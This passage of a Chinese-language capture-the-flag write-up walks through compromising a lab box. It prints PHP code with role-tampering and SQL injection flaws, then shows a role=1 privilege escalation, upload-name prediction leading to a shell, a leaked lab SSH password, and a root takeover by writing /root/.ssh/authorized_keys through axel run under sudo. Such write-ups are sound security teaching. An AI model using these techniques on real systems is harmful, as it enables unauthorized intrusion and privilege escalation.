+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290028037.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290028037.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290028037.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290028037.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290028037.png" /></p>
+<p><code>profile_update.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;auth_check.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$error</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;firstName&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;First Name is required.&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;lastName&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;Last Name is required.&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;Email is required.&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;company&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;Company is required.&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$error</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Error updating profile, reason: &#34;</span> <span class="o">.</span> <span class="nv">$error</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="s2">&#34;db_conn.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;userid&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$statement</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT * FROM users WHERE id = :id&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="nv">$id</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_startup_errors&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$firstName</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;firstName&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$lastName</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;lastName&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$company</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;company&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$role</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$role</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$role</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// dont persist role
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;UPDATE users SET firstName=&#39;</span><span class="si">$firstName</span><span class="s2">&#39;, lastName=&#39;</span><span class="si">$lastName</span><span class="s2">&#39;, email=&#39;</span><span class="si">$email</span><span class="s2">&#39;, company=&#39;</span><span class="si">$company</span><span class="s2">&#39; WHERE id=</span><span class="si">$id</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$statement</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT * FROM users WHERE id = :id&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="nv">$id</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// but return it to avoid confusion
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$role</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;6&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$role</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nx">JSON_PRETTY_PRINT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;No user with this id was found.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意到<code>$_SESSION['role']</code>可以被篡改</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$role</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$role</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>POST传参<code>firstName=test&amp;lastName=test&amp;email=test&amp;company=test&amp;role=1</code>可以看到成功越权,得到<code>admin panel</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290037793.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290037793.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290037793.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290037793.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290037793.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290037793.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290038688.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290038688.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290038688.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290038688.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290038688.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290038688.png" /></p>
+<h2 id="获取user权限">获取user权限</h2>
+<p><code>upload.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;admin_auth_check.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$upload_dir</span> <span class="o">=</span> <span class="s2">&#34;images/uploads/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$upload_dir</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$upload_dir</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$file_hash</span> <span class="o">=</span> <span class="nx">uniqid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="s1">&#39;$file_hash&#39;</span> <span class="o">.</span> <span class="nx">time</span><span class="p">())</span> <span class="o">.</span> <span class="s1">&#39;_&#39;</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$target_file</span> <span class="o">=</span> <span class="nv">$upload_dir</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$error</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$imageFileType</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;submit&#34;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$check</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$check</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&#34;Invalid file&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Check if file already exists
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&#34;Sorry, file already exists.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$imageFileType</span> <span class="o">!=</span> <span class="s2">&#34;jpg&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&#34;This extension is not allowed.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$error</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$target_file</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;The file has been uploaded.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Error: There was an error uploading your file.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Error: &#34;</span> <span class="o">.</span> <span class="nv">$error</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意到文件名是<code>md5('$file_hash' . time())</code>而不是<code>md5(&quot;$file_hash&quot; . time())</code>,因此只需要知道时间戳即可</p>
+<p>成功得到图片为<code>238f241b8f6fe89215ecc1eb02b929db_info.jpg</code>,利用文件包含即可getshell</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292319234.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292319234.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292319234.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292319234.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292319234.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292319234.png" /></p>
+<p>无法直接反弹shell,因此使用正向绑定</p>
+<p><code>linpeas.sh</code>显示<code>-rw-r--r-- 1 root root 627851 Jul 20  2021 /opt/source-files-backup.zip</code></p>
+<p>压缩包中存在<code>.git</code>文件夹</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348749.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348749.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348749.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348749.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348749.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348749.png" /></p>
+<p>用<code>S3cr3t_unGu3ss4bl3_p422w0Rd</code>尝试登录ssh</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348039.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348039.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348039.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348039.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348039.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292348039.png" /></p>
+<h2 id="获取root权限">获取root权限</h2>
+<p><a href="https://man.sr.ht/~rek2/Hispagatos-wiki/writeups/Timing.md" target="_blank" rel="noopener noreffer ">https://man.sr.ht/~rek2/Hispagatos-wiki/writeups/Timing.md</a></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292352395.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292352395.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292352395.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292352395.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292352395.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203292352395.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aaron@timing:/usr/bin$ cat netutils 
+</span></span><span class="line"><span class="cl"><span class="c1">#! /bin/bash</span>
+</span></span><span class="line"><span class="cl">java -jar /root/netutils.jar
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aaron@timing:~$ sudo netutils 
+</span></span><span class="line"><span class="cl">netutils v0.1
+</span></span><span class="line"><span class="cl">Select one option:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> FTP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> HTTP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> Quit
+</span></span><span class="line"><span class="cl">Input &gt;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aaron@timing:~$ nc -lvnp <span class="m">8000</span>
+</span></span><span class="line"><span class="cl">Listening on <span class="o">[</span>0.0.0.0<span class="o">]</span> <span class="o">(</span>family 0, port 8000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Connection from 127.0.0.1 <span class="m">53856</span> received!
+</span></span><span class="line"><span class="cl">GET / HTTP/1.0
+</span></span><span class="line"><span class="cl">Host: 127.0.0.1:8000
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Range: <span class="nv">bytes</span><span class="o">=</span>1-
+</span></span><span class="line"><span class="cl">User-Agent: Axel/2.16.1 <span class="o">(</span>Linux<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://github.com/axel-download-accelerator/axel/blob/6046c2a799d82235337e4cba8c4d1fd8c56bc400/doc/axelrc.example#L69" target="_blank" rel="noopener noreffer ">https://github.com/axel-download-accelerator/axel/blob/6046c2a799d82235337e4cba8c4d1fd8c56bc400/doc/axelrc.example#L69</a></p>
+<p><code>default_filename = default</code></p>
+<p><a href="http://manpages.ubuntu.com/manpages/trusty/zh_CN/man1/axel.1.html" target="_blank" rel="noopener noreffer ">http://manpages.ubuntu.com/manpages/trusty/zh_CN/man1/axel.1.html</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/axelrc 系统全局配置文件
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">~/.axelrc 个人配置文件
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">这些文件正文不会在一个手册页内显示，但我希望跟程序一起安装的样本文件包含足够的信息。
+</span></span><span class="line"><span class="cl">配置文件在不同系统的位置可能不一样。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改配置文件<code>default_filename = /root/.ssh/authorized_keys</code></p>
